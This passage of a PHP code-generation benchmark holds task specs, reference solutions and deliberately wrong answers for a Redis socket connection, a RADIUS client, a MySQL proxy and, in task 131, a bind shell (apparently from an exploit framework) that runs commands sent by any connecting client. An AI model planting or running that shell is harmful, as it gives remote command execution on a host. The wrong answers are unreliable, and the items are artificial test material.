writeRequest(CommandInterface $command) -> [void] - Formats and writes a Redis command to the server",
    "Canonical_solution": "use Predis\\Command\\CommandInterface;\nuse Predis\\NotSupportedException;\nuse Predis\\Response\\Error as ErrorResponse;\nuse Predis\\Response\\ErrorInterface as ErrorResponseInterface;\nuse Predis\\Response\\Status as StatusResponse;\n\nclass PhpiredisSocketConnection extends AbstractConnection\n{\n    private $reader;\n\n    public function __construct(ParametersInterface $parameters)\n    {\n        $this->assertExtensions();\n        parent::__construct($parameters);\n        $this->reader = $this->createReader();\n    }\n\n    public function __destruct()\n    {\n        parent::__destruct();\n        phpiredis_reader_destroy($this->reader);\n    }\n\n    protected function assertExtensions()\n    {\n        if (!extension_loaded('sockets')) {\n            throw new NotSupportedException(\n                'The \"sockets\" extension is required by this connection backend.'\n            );\n        }\n\n        if (!extension_loaded('phpiredis')) {\n            throw new NotSupportedException(\n                'The \"phpiredis\" extension is required by this connection backend.'\n            );\n        }\n    }\n\n    private function createReader()\n    {\n        $reader = phpiredis_reader_create();\n        phpiredis_reader_set_status_handler($reader, $this->getStatusHandler());\n        phpiredis_reader_set_error_handler($reader, $this->getErrorHandler());\n        return $reader;\n    }\n\n    protected function getStatusHandler()\n    {\n        static $statusHandler;\n\n        if (!$statusHandler) {\n            $statusHandler = function ($payload) {\n                return StatusResponse::get($payload);\n            };\n        }\n\n        return $statusHandler;\n    }\n\n    protected function getErrorHandler()\n    {\n        static $errorHandler;\n\n        if (!$errorHandler) {\n            $errorHandler = function ($errorMessage) {\n                return new ErrorResponse($errorMessage);\n            };\n        }\n\n        return $errorHandler;\n    }\n\n    protected function createResource()\n    {\n        $parameters = $this->parameters;\n\n        if ($parameters->scheme === 'unix') {\n            $address = $parameters->path;\n            $domain = AF_UNIX;\n            $protocol = 0;\n        } else {\n            if (false === $address = self::getAddress($parameters)) {\n                $this->onConnectionError(\"Cannot resolve the address of '$parameters->host'.\");\n            }\n\n            $domain = filter_var($address, FILTER_VALIDATE_IP, FILTER_FLAG_IPV6) ? AF_INET6 : AF_INET;\n            $protocol = SOL_TCP;\n        }\n\n        if (false === $socket = @socket_create($domain, SOCK_STREAM, $protocol)) {\n            $this->emitSocketError();\n        }\n\n        $this->setSocketOptions($socket, $parameters);\n        $this->connectWithTimeout($socket, $address, $parameters);\n\n        return $socket;\n    }\n\n    private function connectWithTimeout($socket, $address, ParametersInterface $parameters)\n    {\n        socket_set_nonblock($socket);\n\n        if (@socket_connect($socket, $address, (int) $parameters->port) === false) {\n            $error = socket_last_error();\n            if ($error != SOCKET_EINPROGRESS && $error != SOCKET_EALREADY) {\n                $this->emitSocketError();\n            }\n        }\n\n        socket_set_block($socket);\n\n        $null = null;\n        $selectable = array($socket);\n\n        $timeout = (isset($parameters->timeout) ? (float) $parameters->timeout : 5.0);\n        $timeoutSecs = floor($timeout);\n        $timeoutUSecs = ($timeout - $timeoutSecs) * 1000000;\n\n        $selected = socket_select($selectable, $selectable, $null, $timeoutSecs, $timeoutUSecs);\n\n        if ($selected === 2) {\n            $this->onConnectionError('Connection refused.', SOCKET_ECONNREFUSED);\n        }\n\n        if ($selected === 0) {\n            $this->onConnectionError('Connection timed out.', SOCKET_ETIMEDOUT);\n        }\n\n        if ($selected === false) {\n            $this->emitSocketError();\n        }\n    }\n\n    protected function write($buffer)\n    {\n        $socket = $this->getResource();\n\n        while (($length = strlen($buffer)) > 0) {\n            $written = socket_write($socket, $buffer, $length);\n\n            if ($length === $written) {\n                return;\n            }\n\n            if ($written === false) {\n                $this->onConnectionError('Error while writing bytes to the server.');\n            }\n\n            $buffer = substr($buffer, $written);\n        }\n    }\n\n    public function read()\n    {\n        $socket = $this->getResource();\n        $reader = $this->reader;\n\n        while (PHPIREDIS_READER_STATE_INCOMPLETE === $state = phpiredis_reader_get_state($reader)) {\n            if (@socket_recv($socket, $buffer, 4096, 0) === false || $buffer === '' || $buffer === null) {\n                $this->emitSocketError();\n            }\n\n            phpiredis_reader_feed($reader, $buffer);\n        }\n\n        if ($state === PHPIREDIS_READER_STATE_COMPLETE) {\n            return phpiredis_reader_get_reply($reader);\n        } else {\n            $this->onProtocolError(phpiredis_reader_get_error($reader));\n            return;\n        }\n    }\n\n    public function writeRequest(CommandInterface $command)\n    {\n        $arguments = $command->getArguments();\n        array_unshift($arguments, $command->getId());\n        $this->write(phpiredis_format_command($arguments));\n    }\n}",
    "Code_level": "Class-level",
    "FSMID_for_test": 137,
    "wrong_result": "```php\nclass PhpiredisSocketConnection implements RedisClientConnectionInterface\n{\n    private $reader;\n    private $parameters;\n\n    public function __construct(ParametersInterface $parameters)\n    {\n        $this->parameters = $parameters;\n        $this->assertExtensions();\n        $this->reader = $this->createReader();\n    }\n\n    public function __destruct()\n    {\n        if (is_resource($this->reader)) {\n            phpiredis_reader_free($this->reader);\n        }\n    }\n\n    private function assertExtensions()\n    {\n        if (!extension_loaded('phpiredis')) {\n            throw new \\RuntimeException('phpiredis extension is not loaded');\n        }\n    }\n\n    private function createReader()\n    {\n        $reader = phpiredis_reader_new();\n        phpiredis_reader_set_status_handler($reader, $this->getStatusHandler());\n        phpiredis_reader_set_error_handler($reader, $this->getErrorHandler());\n        return $reader;\n    }\n\n    private function getStatusHandler()\n    {\n        return function ($reader, $status) {\n            // Handle status response\n        };\n    }\n\n    private function getErrorHandler()\n    {\n        return function ($reader, $error) {\n            // Handle error response\n        };\n    }\n\n    private function createResource()\n    {\n        $socket = stream_socket_client(\n            'tcp://' . $this->parameters->getHost() . ':' . $this->parameters->getPort(),\n            $errno,\n            $errstr,\n            $this->parameters->getTimeout()\n        );\n\n        if (!$socket) {\n            throw new \\RuntimeException(\"Failed to connect to Redis: $errstr ($errno)\");\n        }\n\n        return $socket;\n    }\n\n    private function connectWithTimeout($socket, $address, ParametersInterface $parameters)\n    {\n        $timeout = $parameters->getTimeout();\n        $startTime = microtime(true);\n\n        while (true) {\n            $select = stream_select([$socket], [], [], $timeout);\n            if ($select === false) {\n                throw new \\RuntimeException(\"Failed to connect to Redis: stream_select failed\");\n            } elseif ($select > 0) {\n                break;\n            }\n\n            $elapsed = microtime(true) - $startTime;\n            if ($elapsed >= $timeout) {\n                throw new \\RuntimeException(\"Failed to connect to Redis: connection timed out\");\n            }\n        }\n    }\n\n    public function write($buffer)\n    {\n        $socket = $this->createResource();\n        $this->connectWithTimeout($socket, 'tcp://' . $this->parameters->getHost() . ':' . $this->parameters->getPort(), $this->parameters);\n        fwrite($socket, $buffer);\n        fclose($socket);\n    }\n\n    public function read()\n    {\n        return phpiredis_reader_get_reply($this->reader);\n    }\n\n    public function writeRequest(CommandInterface $command)\n    {\n        $buffer = $command->getBuffer();\n        $this->write($buffer);\n    }\n}\n```"
  },
  {
    "Task_id": 129,
    "Instruction": "Task Description: Implement a Radius class in PHP that handles RADIUS protocol communication for authentication and accounting purposes using UDP sockets.\n\nClass Description: The Radius class provides functionality to communicate with a RADIUS server for authentication (Access-Request) and accounting operations. It handles packet construction, socket communication, and response parsing according to RADIUS protocol standards.\n\nAttributes:\n\n_ip_radius_server: [string] - IP address of the RADIUS server\n_shared_secret: [string] - Shared secret for communication with RADIUS server\n_radius_suffix: [string] - Suffix to append to usernames\n_udp_timeout: [int] - Timeout for UDP operations in seconds\n_authentication_port: [int] - Port for authentication requests (default 1812)\n_accounting_port: [int] - Port for accounting requests (default 1813)\n_nas_ip_address: [string] - NAS IP address to send in requests\n_nas_port: [int] - NAS port to send in requests\n_encrypted_password: [string] - Encrypted password for authentication\n_user_ip_address: [string] - User's IP address\n_request_authenticator: [string] - Request authenticator value\n_response_authenticator: [string] - Response authenticator value\n_username: [string] - Username for authentication\n_password: [string] - Password for authentication\n_identifier_to_send: [int] - Packet identifier to send\n_identifier_received: [int] - Received packet identifier\n_radius_packet_to_send: [int] - RADIUS packet code to send\n_radius_packet_received: [int] - Received RADIUS packet code\n_attributes_to_send: [array] - Attributes to include in outgoing packets\n_attributes_received: [array] - Attributes received from server\n_socket_to_server: [resource] - Socket connection to server\n_debug_mode: [bool] - Debug mode flag\ndebug_text: [array] - Debug messages\n_attributes_info: [array] - RADIUS attribute information\n_radius_packet_info: [array] - RADIUS packet type information\n_last_error_code: [int] - Last error code\n_last_error_message: [string] - Last error message\n\nMethods:\n\n__construct: [function]($ip_radius_server = '127.0.0.1', $shared_secret = '', $radius_suffix = '', $udp_timeout = 5, $authentication_port = 1812, $accounting_port = 1813) -> [void] - Initializes the Radius object with server details and default values\n\nAccessRequest: [function]($username = '', $password = '', $udp_timeout = 0, $state = NULL) -> [bool] - Sends an Access-Request to the RADIUS server and returns true if authentication is successful (Access-Accept received)\n\nSetIpRadiusServer: [function]($ip_radius_server) -> [void] - Sets the RADIUS server IP address\n\nSetSharedSecret: [function]($shared_secret) -> [void] - Sets the shared secret for RADIUS communication\n\nSetAuthenticationPort: [function]($authentication_port) -> [void] - Sets the authentication port\n\nSetAccountingPort: [function]($accounting_port) -> [void] - Sets the accounting port\n\nSetRadiusSuffix: [function]($radius_suffix) -> [void] - Sets the username suffix\n\nSetUdpTimeout: [function]($udp_timeout) -> [void] - Sets the UDP timeout value\n\nSetUsername: [function]($username = '') -> [void] - Sets the username for authentication\n\nSetPassword: [function]($password = '') -> [void] - Sets the password for authentication\n\nSetNasIpAddress: [function]($nas_ip_address = '') -> [void] - Sets the NAS IP address\n\nSetNasPort: [function]($nas_port = 0) -> [void] - Sets the NAS port\n\nSetPacketCodeToSend: [function]($packet_code) -> [void] - Sets the RADIUS packet code to send\n\nSetAttribute: [function]($attribute_type, $attribute_value) -> [void] - Adds an attribute to the outgoing packet\n\nGetNextIdentifier: [function]() -> [int] - Returns the next packet identifier\n\nGenerateRequestAuthenticator: [function]() -> [void] - Generates a new request authenticator\n\nDecodeAttribute: [function]($attribute_raw_value, $attribute_type) -> [mixed] - Decodes a received attribute value\n\nClearLastError: [function]() -> [void] - Clears the last error information\n\nClearDataToSend: [function]() -> [void] - Clears all data to be sent\n\nClearDataReceived: [function]() -> [void] - Clears all received data",
    "Canonical_solution": "class Radius\n{\n    var $_ip_radius_server;\n    var $_shared_secret;\n    var $_radius_suffix;\n    var $_udp_timeout;\n    var $_authentication_port;\n    var $_accounting_port;\n    var $_nas_ip_address;\n    var $_nas_port;\n    var $_encrypted_password;\n    var $_user_ip_address;\n    var $_request_authenticator;\n    var $_response_authenticator;\n    var $_username;\n    var $_password;\n    var $_identifier_to_send;\n    var $_identifier_received;\n    var $_radius_packet_to_send;\n    var $_radius_packet_received;\n    var $_attributes_to_send;\n    var $_attributes_received;\n    var $_socket_to_server;\n    var $_debug_mode;\n    var $debug_text = [];\n    var $_attributes_info;\n    var $_radius_packet_info;\n    var $_last_error_code;\n    var $_last_error_message;\n\n    public function __construct($ip_radius_server = '127.0.0.1', $shared_secret = '', $radius_suffix = '', $udp_timeout = 5, $authentication_port = 1812, $accounting_port = 1813)\n    {\n        $this->_radius_packet_info[1] = 'Access-Request';\n        $this->_radius_packet_info[2] = 'Access-Accept';\n        $this->_radius_packet_info[3] = 'Access-Reject';\n        $this->_radius_packet_info[4] = 'Accounting-Request';\n        $this->_radius_packet_info[5] = 'Accounting-Response';\n        $this->_radius_packet_info[11] = 'Access-Challenge';\n        $this->_radius_packet_info[12] = 'Status-Server (experimental)';\n        $this->_radius_packet_info[13] = 'Status-Client (experimental)';\n        $this->_radius_packet_info[255] = 'Reserved';\n\n        $this->_identifier_to_send = 0;\n        $this->_user_ip_address = (isset($_SERVER['REMOTE_ADDR']) ? $_SERVER['REMOTE_ADDR'] : '0.0.0.0');\n\n        $this->GenerateRequestAuthenticator();\n        $this->SetIpRadiusServer($ip_radius_server);\n        $this->SetSharedSecret($shared_secret);\n        $this->SetAuthenticationPort($authentication_port);\n        $this->SetAccountingPort($accounting_port);\n        $this->SetRadiusSuffix($radius_suffix);\n        $this->SetUdpTimeout($udp_timeout);\n        $this->SetUsername();\n        $this->SetPassword();\n        $this->SetNasIpAddress();\n        $this->SetNasPort();\n\n        $this->ClearLastError();\n        $this->ClearDataToSend();\n        $this->ClearDataReceived();\n    }\n\n    function AccessRequest($username = '', $password = '', $udp_timeout = 0, $state = NULL)\n    {\n        $this->ClearDataReceived();\n        $this->ClearLastError();\n\n        $this->SetPacketCodeToSend(1);\n\n        if (0 < strlen($username))\n        {\n            $this->SetUsername($username);\n        }\n\n        if (0 < strlen($password))\n        {\n            $this->SetPassword($password);\n        }\n\n        if ($state !== NULL)\n        {\n            $this->SetAttribute(24, $state);\n        }\n        else\n        {\n            $this->SetAttribute(6, 1);\n        }\n\n        if (intval($udp_timeout) > 0)\n        {\n            $this->SetUdpTimeout($udp_timeout);\n        }\n\n        $attributes_content = '';\n        $attribute_count1 = count((array)$this->_attributes_to_send);\n        for ($attributes_loop = 0; $attributes_loop < $attribute_count1; $attributes_loop++)\n        {\n            $attributes_content .= $this->_attributes_to_send[$attributes_loop];\n        }\n\n        $packet_length  = 4;\n        $packet_length += strlen($this->_request_authenticator);\n        $packet_length += strlen($attributes_content);\n\n        $packet_data  = chr($this->_radius_packet_to_send);\n        $packet_data .= chr($this->GetNextIdentifier());\n        $packet_data .= chr(intval($packet_length / 256));\n        $packet_data .= chr(intval($packet_length % 256));\n        $packet_data .= $this->_request_authenticator;\n        $packet_data .= $attributes_content;\n\n        $_socket_to_server = socket_create(AF_INET, SOCK_DGRAM, 17);\n\n        if ($_socket_to_server === FALSE)\n        {\n            $this->_last_error_code    = socket_last_error();\n            $this->_last_error_message = socket_strerror($this->_last_error_code);\n        }\n        elseif (FALSE === socket_connect($_socket_to_server, $this->_ip_radius_server, $this->_authentication_port))\n        {\n            $this->_last_error_code    = socket_last_error();\n            $this->_last_error_message = socket_strerror($this->_last_error_code);\n        }\n        elseif (FALSE === socket_write($_socket_to_server, $packet_data, $packet_length))\n        {\n            $this->_last_error_code    = socket_last_error();\n            $this->_last_error_message = socket_strerror($this->_last_error_code);\n        }\n        else\n        {\n            $read_socket_array   = array($_socket_to_server);\n            $write_socket_array  = NULL;\n            $except_socket_array = NULL;\n\n            $received_packet = chr(0);\n\n            if (!(FALSE === socket_select($read_socket_array, $write_socket_array, $except_socket_array, $this->_udp_timeout)))\n            {\n                if (in_array($_socket_to_server, $read_socket_array))\n                {\n                    if (FALSE === ($received_packet = @socket_read($_socket_to_server, 1024)))\n                    {\n                        $received_packet = chr(0);\n                        $this->_last_error_code    = socket_last_error();\n                        $this->_last_error_message = socket_strerror($this->_last_error_code);\n                    }\n                    else\n                    {\n                        socket_close($_socket_to_server);\n                    }\n                }\n            }\n            else\n            {\n                socket_close($_socket_to_server);\n            }\n        }\n\n        $this->_radius_packet_received = intval(ord(substr($received_packet, 0, 1)));\n\n        if ($this->_radius_packet_received > 0)\n        {\n            $this->_identifier_received = intval(ord(substr($received_packet, 1, 1)));\n            $packet_length = (intval(ord(substr($received_packet, 2, 1))) * 256) + (intval(ord(substr($received_packet, 3, 1)));\n            $this->_response_authenticator = substr($received_packet, 4, 16);\n            $attributes_content = substr($received_packet, 20, ($packet_length - 4 - 16));\n            while (strlen($attributes_content) > 2)\n            {\n                $attribute_type = intval(ord(substr($attributes_content, 0, 1)));\n                $attribute_length = intval(ord(substr($attributes_content, 1, 1)));\n                $attribute_raw_value = substr($attributes_content, 2, $attribute_length - 2);\n                $attributes_content = substr($attributes_content, $attribute_length);\n\n                $attribute_value = $this->DecodeAttribute($attribute_raw_value, $attribute_type);\n\n                $this->_attributes_received[] = array($attribute_type, $attribute_value);\n            }\n        }\n\n        return (2 == ($this->_radius_packet_received));\n    }\n}",
    "Code_level": "Class-level",
    "FSMID_for_test": 137,
    "wrong_result": "```php\n<?php\n\nclass Radius\n{\n    private $_ip_radius_server;\n    private $_shared_secret;\n    private $_radius_suffix;\n    private $_udp_timeout;\n    private $_authentication_port;\n    private $_accounting_port;\n    private $_nas_ip_address;\n    private $_nas_port;\n    private $_encrypted_password;\n    private $_user_ip_address;\n    private $_request_authenticator;\n    private $_response_authenticator;\n    private $_username;\n    private $_password;\n    private $_identifier_to_send;\n    private $_identifier_received;\n    private $_radius_packet_to_send;\n    private $_radius_packet_received;\n    private $_attributes_to_send;\n    private $_attributes_received;\n    private $_socket_to_server;\n    private $_debug_mode;\n    private $_debug_text;\n    private $_attributes_info;\n    private $_radius_packet_info;\n    private $_last_error_code;\n    private $_last_error_message;\n\n    public function __construct($ip_radius_server = '127.0.0.1', $shared_secret = '', $radius_suffix = '', $udp_timeout = 5, $authentication_port = 1812, $accounting_port = 1813)\n    {\n        $this->_ip_radius_server = $ip_radius_server;\n        $this->_shared_secret = $shared_secret;\n        $this->_radius_suffix = $radius_suffix;\n        $this->_udp_timeout = $udp_timeout;\n        $this->_authentication_port = $authentication_port;\n        $this->_accounting_port = $accounting_port;\n        $this->_nas_ip_address = '';\n        $this->_nas_port = 0;\n        $this->_encrypted_password = '';\n        $this->_user_ip_address = '';\n        $this->_request_authenticator = '';\n        $this->_response_authenticator = '';\n        $this->_username = '';\n        $this->_password = '';\n        $this->_identifier_to_send = 0;\n        $this->_identifier_received = 0;\n        $this->_radius_packet_to_send = 0;\n        $this->_radius_packet_received = 0;\n        $this->_attributes_to_send = array();\n        $this->_attributes_received = array();\n        $this->_socket_to_server = NULL;\n        $this->_debug_mode = false;\n        $this->_debug_text = array();\n        $this->_attributes_info = array();\n        $this->_radius_packet_info = array();\n        $this->_last_error_code = 0;\n        $this->_last_error_message = '';\n    }\n\n    public function AccessRequest($username = '', $password = '', $udp_timeout = 0, $state = NULL)\n    {\n        // Implementation of AccessRequest method\n    }\n\n    public function SetIpRadiusServer($ip_radius_server)\n    {\n        // Implementation of SetIpRadiusServer method\n    }\n\n    public function SetSharedSecret($shared_secret)\n    {\n        // Implementation of SetSharedSecret method\n    }\n\n    public function SetAuthenticationPort($authentication_port)\n    {\n        // Implementation of SetAuthenticationPort method\n    }\n\n    public function SetAccountingPort($accounting_port)\n    {\n        // Implementation of SetAccountingPort method\n    }\n\n    public function SetRadiusSuffix($radius_suffix)\n    {\n        // Implementation of SetRadiusSuffix method\n    }\n\n    public function SetUdpTimeout($udp_timeout)\n    {\n        // Implementation of SetUdpTimeout method\n    }\n\n    public function SetUsername($username = '')\n    {\n        // Implementation of SetUsername method\n    }\n\n    public function SetPassword($password = '')\n    {\n        // Implementation of SetPassword method\n    }\n\n    public function SetNasIpAddress($nas_ip_address = '')\n    {\n        // Implementation of SetNasIpAddress method\n    }\n\n    public function SetNasPort($nas_port = 0)\n    {\n        // Implementation of SetNasPort method\n    }\n\n    public function SetPacketCodeToSend($packet_code)\n    {\n        // Implementation of SetPacketCodeToSend method\n    }\n\n    public function SetAttribute($attribute_type, $attribute_value)\n    {\n        // Implementation of SetAttribute method\n    }\n\n    public function GetNextIdentifier()\n    {\n        // Implementation of GetNextIdentifier method\n    }\n\n    public function GenerateRequestAuthenticator()\n    {\n        // Implementation of GenerateRequestAuthenticator method\n    }\n\n    public function DecodeAttribute($attribute_raw_value, $attribute_type)\n    {\n        // Implementation of DecodeAttribute method\n    }\n\n    public function ClearLastError()\n    {\n        // Implementation of ClearLastError method\n    }\n\n    public function ClearDataToSend()\n    {\n        // Implementation of ClearDataToSend method\n    }\n\n    public function ClearDataReceived()\n    {\n        // Implementation of ClearDataReceived method\n    }\n}\n\n?>\n```"
  },
  {
    "Task_id": 131,
    "Instruction": "Task Description: Create a PHP function that implements a basic TCP socket server capable of handling client connections, executing commands, and managing directory changes.\n\nFunction Description: The function starts a TCP socket server on a specified port, accepts client connections, and provides an interactive shell-like interface. It handles 'cd' commands for directory navigation, 'exit'/'quit' commands for termination, and executes other system commands. The server sends command outputs and current working directory information back to the client.\n\nInput:\n- $port: integer - The port number to bind the server socket to\n- $wpxf_disabled: array - List of disabled functions/callables\n- $wpxf_exec: callable - Function to execute system commands\n\nOutput: None (The function runs indefinitely until the client disconnects or sends an exit command)",
    "Canonical_solution": "function start_socket_server($port, $wpxf_disabled, $wpxf_exec)\n{\n    $scl = 'socket_create_listen';\n    if (is_callable($scl) && !in_array($scl, $wpxf_disabled)) {\n        $sock = @$scl($port);\n    } else {\n        $sock = @socket_create(AF_INET, SOCK_STREAM, SOL_TCP);\n        $ret = @socket_bind($sock, 0, $port);\n        $ret = @socket_listen($sock, 5);\n    }\n\n    $msg_sock = @socket_accept($sock);\n    @socket_close($sock);\n\n    $output = getcwd() . ' > ';\n    @socket_write($msg_sock, $output, strlen($output));\n\n    while (false !== @socket_select($r = array($msg_sock), $w = null, $e = null, null)) {\n        $output = '';\n        $cmd = @socket_read($msg_sock, 2048, PHP_NORMAL_READ);\n\n        if (false === $cmd) {\n            break;\n        }\n        if (substr($cmd, 0, 3) == 'cd ') {\n            chdir(substr($cmd, 3, -1));\n            $output = getcwd() . ' > ';\n        } elseif (substr($cmd, 0, 4) == 'quit' || substr($cmd, 0, 4) == 'exit') {\n            break;\n        } else {\n            if (false === strpos(strtolower(PHP_OS), 'win')) {\n                $cmd = rtrim($cmd) . ' 2>&1';\n            }\n\n            $output = $wpxf_exec($cmd);\n            $output .= getcwd() . ' > ';\n        }\n\n        @socket_write($msg_sock, $output, strlen($output));\n    }\n\n    @socket_close($msg_sock);\n}",
    "Code_level": "Function-level",
    "FSMID_for_test": 136,
    "wrong_result": "```php\nfunction start_server($port, $wpxf_disabled, $wpxf_exec) {\n    $server = stream_socket_server(\"tcp://0.0.0.0:$port\", $errno, $errstr);\n    if (!$server) {\n        die(\"$errstr ($errno)\\n\");\n    }\n    echo \"Server started on port $port\\n\";\n    while ($client = stream_socket_accept($server)) {\n        echo \"Client connected\\n\";\n        $cwd = getcwd();\n        $output = \"Current directory: $cwd\\n\";\n        fwrite($client, $output);\n        while (true) {\n            $input = fread($client, 1024);\n            if (trim($input) === 'exit' || trim($input) === 'quit') {\n                break;\n            }\n            if (strpos($input, 'cd ') === 0) {\n                $dir = trim(substr($input, 3));\n                if (chdir($dir)) {\n                    $cwd = getcwd();\n                    $output = \"Current directory: $cwd\\n\";\n                } else {\n                    $output = \"Failed to change directory\\n\";\n                }\n            } else {\n                $output = $wpxf_exec($input);\n            }\n            fwrite($client, $output);\n        }\n        echo \"Client disconnected\\n\";\n        fclose($client);\n    }\n    fclose($server);\n}\n```"
  },
  {
    "Task_id": 132,
    "Instruction": "Task Description: Create a MySQL proxy class that handles communication between a client and MySQL server using Swoole's coroutine client for TCP/UDP communication, implementing authentication and packet handling.\n\nClass Description: MysqlProxy - A class that manages MySQL protocol communication between client and server, handling connection establishment, authentication, packet processing, and error handling.\n\nAttributes:\n\nisDuplex: [bool] - Indicates whether duplex communication is supported by Swoole version\nserver: [swoole_server] - Swoole server instance\nserverFd: [int] - File descriptor of the server connection\ncharset: [string] - Character set for MySQL communication\naccount: [array] - MySQL account credentials\nauth: [bool] - Authentication status flag\nchan: [Swoole\\Coroutine\\Channel] - Coroutine channel for communication\nserverPublicKey: [string] - Server's public key for authentication\nsalt: [array] - Salt used for password encryption\nconnected: [bool] - Connection status flag\ntimeout: [float] - Connection timeout value\nmysqlClient: [Swoole\\Coroutine\\Channel] - Channel for MySQL client communication\nmysqlServer: [HandshakePacket] - Server handshake information\nclient: [Swoole\\Coroutine\\Client] - Coroutine client instance\n\nMethods:\n\n__construct: [function](swoole_server $server, int $fd, Swoole\\Coroutine\\Channel $chan) -> [void] - Initializes the proxy with server, file descriptor and channel\nconnect: [function](string $host, int $port, float $timeout = 0.1, int $tryStep = 0) -> [Client|bool] - Establishes connection to MySQL server with retry logic\nonClientReceive: [function](Swoole\\Coroutine\\Client $cli, string $data) -> [void] - Handles incoming data from MySQL server\nprocessAuth: [function](string $pluginName) -> [array] - Processes authentication based on plugin type\nsend: [function](...$data) -> [bool] - Sends data to MySQL server\nrecv: [function](&$remain) -> [mixed] - Receives data from MySQL server\nonClientClose: [function](Swoole\\Coroutine\\Client $cli) -> [void] - Handles client connection closure\nonClientError: [function](Swoole\\Coroutine\\Client $cli) -> [void] - Handles client errors",
    "Canonical_solution": "use Swoole\\Coroutine\\Client;\nuse SMProxy\\MysqlPacket\\AuthPacket;\nuse SMProxy\\MysqlPacket\\BinaryPacket;\nuse SMProxy\\MysqlPacket\\ErrorPacket;\nuse SMProxy\\MysqlPacket\\HandshakePacket;\nuse SMProxy\\MysqlPacket\\MySQLMessage;\nuse SMProxy\\MysqlPacket\\OkPacket;\nuse SMProxy\\MysqlPacket\\Util\\Capabilities;\nuse SMProxy\\MysqlPacket\\Util\\CharsetUtil;\nuse SMProxy\\MysqlPacket\\Util\\SecurityUtil;\nuse SMProxy\\MysqlPool\\MySQLException;\nuse SMProxy\\MysqlPool\\MySQLPool;\n\nclass MysqlProxy\n{\n    private $isDuplex;\n    public $server;\n    public $serverFd;\n    public $charset;\n    public $account;\n    public $auth = false;\n    public $chan;\n    public $serverPublicKey;\n    public $salt;\n    public $connected = false;\n    public $timeout = 0.1;\n    public $mysqlClient;\n    public $mysqlServer;\n    public $client;\n\n    public function __construct(\\swoole_server $server, int $fd, \\Swoole\\Coroutine\\Channel $chan)\n    {\n        $this->server = $server;\n        $this->serverFd = $fd;\n        $this->chan = $chan;\n        $this->client = new Client(CONFIG['server']['swoole_client_sock_setting']['sock_type'] ?? SWOOLE_SOCK_TCP);\n        $this->client->set(CONFIG['server']['swoole_client_setting'] ?? []);\n        $this->client->set(packageLengthSetting());\n        $this->isDuplex = version_compare(SWOOLE_VERSION, '4.2.13', '>=');\n        if (!$this->isDuplex) {\n            $this->mysqlClient = new Channel(1);\n        }\n    }\n\n    public function connect(string $host, int $port, float $timeout = 0.1, int $tryStep = 0)\n    {\n        $this->timeout = $timeout;\n        if (!$this->client->connect($host, $port, $timeout)) {\n            if ($tryStep < 3) {\n                $this->client->close();\n                return $this->connect($host, $port, $timeout, ++$tryStep);\n            } else {\n                $this->onClientError($this->client);\n                return false;\n            }\n        } else {\n            if (!$this->isDuplex) {\n                $this->mysqlClient->push($this->client);\n            }\n            self::go(function () {\n                $remain = '';\n                while (true) {\n                    $data = $this->recv($remain);\n                    if ($data === '' || $data === false) {\n                        break;\n                    }\n                }\n            });\n            return $this->client;\n        }\n    }\n\n    public function onClientReceive(\\Swoole\\Coroutine\\Client $cli, string $data)\n    {\n        self::go(function () use ($cli, $data) {\n            $fd = $this->serverFd;\n            $binaryPacket = new BinaryPacket();\n            $binaryPacket->data = getBytes($data);\n            $binaryPacket->packetLength = $binaryPacket->calcPacketSize();\n            if (isset($binaryPacket->data[4])) {\n                $send = true;\n                if ($binaryPacket->data[4] == ErrorPacket::$FIELD_COUNT) {\n                    $errorPacket = new ErrorPacket();\n                    $errorPacket->read($binaryPacket);\n                    $data = getString($errorPacket->write());\n                } elseif (!$this->connected) {\n                    if ($binaryPacket->data[4] == OkPacket::$FIELD_COUNT) {\n                        $send = false;\n                        $this->connected = true;\n                        $this->chan->push($this);\n                    } elseif ($binaryPacket->data[4] == 0x01) {\n                        if ($binaryPacket->packetLength == 6) {\n                            if ($binaryPacket->data[$binaryPacket->packetLength - 1] == 4) {\n                                $data = getString(array_merge(getMysqlPackSize(1), [3, 2]));\n                                $this->send($data);\n                            }\n                        } else {\n                            $this->serverPublicKey = substr($data, 5, strlen($data) - 2);\n                            $encryptData = SecurityUtil::sha2RsaEncrypt($this->account['password'], $this->salt, $this->serverPublicKey);\n                            $data = getString(array_merge(getMysqlPackSize(strlen($encryptData)), [5])) . $encryptData;\n                            $this->send($data);\n                        }\n                        $send = false;\n                    } elseif ($binaryPacket->data[4] == 0xfe) {\n                        $mm = new MySQLMessage($binaryPacket->data);\n                        $mm->move(5);\n                        $pluginName = $mm->readStringWithNull();\n                        $this->salt = $mm->readBytesWithNull();\n                        $password = $this->processAuth($pluginName ?: 'mysql_native_password');\n                        $this->send(getString(array_merge(getMysqlPackSize(count($password)), [3], $password)));\n                        $send = false;\n                    } elseif (!$this->auth) {\n                        $handshakePacket = (new HandshakePacket())->read($binaryPacket);\n                        $this->mysqlServer = $handshakePacket;\n                        $this->salt = array_merge($handshakePacket->seed, $handshakePacket->restOfScrambleBuff);\n                        $password = $this->processAuth($handshakePacket->pluginName);\n                        $clientFlag = Capabilities::CLIENT_CAPABILITIES;\n                        $authPacket = new AuthPacket();\n                        $authPacket->pluginName = $handshakePacket->pluginName;\n                        $authPacket->packetId = 1;\n                        if (isset($this->database) && $this->database) {\n                            $authPacket->database = $this->database;\n                        } else {\n                            $authPacket->database = 0;\n                        }\n                        if ($authPacket->database) {\n                            $clientFlag |= Capabilities::CLIENT_CONNECT_WITH_DB;\n                        }\n                        if (version_compare($handshakePacket->serverVersion, '5.0', '>=')) {\n                            $clientFlag |= Capabilities::CLIENT_MULTI_RESULTS;\n                        }\n                        $authPacket->clientFlags = $clientFlag;\n                        $authPacket->serverCapabilities = $handshakePacket->serverCapabilities;\n                        $authPacket->maxPacketSize =\n                            CONFIG['server']['swoole_client_setting']['package_max_length'] ?? 16777215;\n                        $authPacket->charsetIndex = CharsetUtil::getIndex($this->charset ?? 'utf8mb4');\n                        $authPacket->user = $this->account['user'];\n                        $authPacket->password = $password;\n                        $this->auth = true;\n                        $this->send(getString($authPacket->write()));\n                        $send = false;\n                    }\n                }\n                if ($send && $this->server->exist($fd)) {\n                    $this->server->send($fd, $data);\n                }\n            }\n        });\n    }\n\n    public function processAuth(string $pluginName)\n    {\n        switch ($pluginName) {\n            case 'mysql_native_password':\n                $password = SecurityUtil::scramble411($this->account['password'], $this->salt);\n                break;\n            case 'caching_sha2_password':\n                $password = SecurityUtil::scrambleSha256($this->account['password'], $this->salt);\n                break;\n            case 'sha256_password':\n                throw new MySQLException('Sha256_password plugin is not supported yet');\n                break;\n            case 'mysql_old_password':\n                throw new MySQLException('mysql_old_password plugin is not supported yet');\n                